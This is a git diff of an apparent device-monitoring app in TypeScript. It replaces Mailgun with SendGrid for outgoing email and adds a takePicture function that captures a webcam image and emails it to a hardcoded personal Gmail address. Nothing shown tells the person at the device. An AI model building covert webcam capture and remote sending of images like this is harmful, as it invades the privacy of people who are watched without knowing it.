@@ -8,13 +8,16 @@ import { encode } from 'base64-arraybuffer';
 import internetAvailable from 'internet-available';
 import child_proccess from 'child_process';
 import BrowserHistory from 'node-browser-history';
-import { DEVICES_NODE, API_KEY, DOMAIN } from './constants/constant';
+import { DEVICES_NODE } from './constants/constant';
 import { initializeFirebase } from './helper/firebase.helper';
 import { logEvent, getCurrentDateTime } from './helper/app.helper';
 import { Device, DeviceInfo, LiveStatus, ScreenShot, BrowserHistoryInfo } from './models';
 import { DeviceStatus, ImageStatus } from './enums';
 import { CommandType } from './enums/commandType.enum';
-import Mailgun from 'mailgun-js';
+import sgMail from '@sendgrid/mail';
+import fs from 'fs';
+import NodeWebcam from 'node-webcam';
+import { sendgrid_apiKey } from './configs';
 
 export const state = {
     email: '',
@@ -218,21 +221,57 @@ function takeScreenshot() {
 
 }
 
-function sendUserEmail(to: Array<string>, subject: string, message: string) {
-    const mailgun = new Mailgun({ apiKey: API_KEY, domain: DOMAIN });
-    const data = {
-        from: 'postmaster@pss.monitoring.com',
-        to: to.toString(),
+function sendUserEmail(to: Array<string>, subject: string, text: string, attachments: Array<any>) {
+    sgMail.setApiKey(sendgrid_apiKey);
+    const msg = {
+        to,
+        from: 'noreplypss@pssmonitoring.com',
         subject,
-        message
+        text,
+        attachments
     };
-    mailgun.messages().send(data, (error, body) => {
-        if (error) {
-            logEvent('Mail Error', error.message);
+    sgMail.send(msg).then((response) => {
+        if (response['0'].statusCode === 202) {
+            logEvent('Mail Sent', msg.to.toString() + '|' + msg.subject + '|' + msg.text);
         } else {
-            logEvent('Sent Mail', 'Mail Data:' + JSON.stringify(data));
+            logEvent('Mail Send Error', response['0'].statusCode + '||' + msg.to.toString() + '|' + msg.subject + '|' + msg.text);
         }
+    }).catch((err) => {
+        logEvent('Mail Send Error', JSON.stringify(err) + '||' + msg.to.toString() + '|' + msg.subject + '|' + msg.text);
     });
+}
+
+function takePicture() {
+    sysInfo.graphics().then((info) => {
+        const width = info.displays[0].sizex;
+        const height = info.displays[0].sizey;
+        var opts = {
+            width: width,
+            height: height,
+            quality: 100,
+            delay: 0,
+            saveShots: true,
+            output: "jpeg",
+            device: false,
+            verbose: false,
+            callbackReturn: "base64"
+        };
+        const Webcam = NodeWebcam.create(opts);
+        Webcam.capture("webcam", function (err: any, data: any) {
+            if (err) {
+                logEvent('Webcam Capture Error', JSON.stringify(err));
+            }
+            if (data) {
+                sendUserEmail(
+                    ['anjariamohnish@gmail.com'],
+                    'Webcam',
+                    'Picture Click on ',
+                    [{ filename: 'webcam.jpg', content: data.replace('data:image/jpeg;base64,', ''), contentId: 'webcam' }]);
+            }
+        });
+    }).catch((err) => {
+        logEvent('Take Picture Error Sysinfo', JSON.stringify(err));
+    })
 }
 
 function checkForInternet() {
@@ -291,4 +330,4 @@ function shutDownSystem() {
         })
 }
 
-startUp();
+// startUp();
